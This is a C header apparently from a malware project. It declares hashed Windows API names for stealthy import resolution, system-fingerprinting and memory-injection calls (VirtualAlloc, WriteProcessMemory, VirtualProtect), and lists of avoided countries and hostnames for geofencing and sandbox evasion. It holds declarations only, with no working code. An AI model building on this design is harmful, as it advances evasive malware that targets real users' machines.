#ifndef OBJHASH_H
#define OBJHASH_H

#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>

// Structure to represent a hashed object with rotation details
typedef struct {
    unsigned int value;          // Hash value
    uint8_t rotation_value;      // Rotation value for the hash
    bool is_rotation_right;      // Direction of rotation
} ObjHash;

// external hash constants for various modules and functions
extern const ObjHash USER32_HASH;
extern const ObjHash KERNEL32_HASH;

// Hashes for function names
extern const ObjHash LOAD_LIBRARY_HASH;
extern const ObjHash GET_PROC_ADDRESS_HASH;
extern const ObjHash QUERY_INFORMATION_PROCESS_HASH;

// Hashes for system information functions
extern const ObjHash GET_COMPUTER_NAME_HASH;
extern const ObjHash GET_DISK_FREE_SPACE_HASH;
extern const ObjHash GET_SYSTEM_INFO_HASH;
extern const ObjHash GET_KEYBOARD_LAYOUT_HASH;
extern const ObjHash GLOBAL_MEMORY_STATUS_HASH;

// Hashes for language and locale functions
extern const ObjHash GET_SYSTEM_DEFAULT_LANGID_HASH;
extern const ObjHash GET_SYSTEM_DEFAULT_LCID_HASH;

// Hashes for memory and thread management functions
extern const ObjHash VIRTUAL_ALLOC_HASH;
extern const ObjHash WRITE_MEMORY_HASH;
extern const ObjHash VIRTUAL_PROTECT_HASH;

// external arrays and sizes for avoided hostnames and countries
extern const ObjHash TARGET_HOSTNAME_PREFIX_HASH;
extern const ObjHash AVOIDED_HOSTNAME_PREFIX_HASHES[];

// List of country codes to avoid
extern const uint16_t AVOIDED_COUNTRIES[];

// Sizes of the avoided hostname and country arrays
extern const size_t AVOIDED_HOSTNAME_PREFIX_HASHES_SIZE;
extern const size_t AVOIDED_COUNTRIES_SIZE;

#endif // OBJHASH_H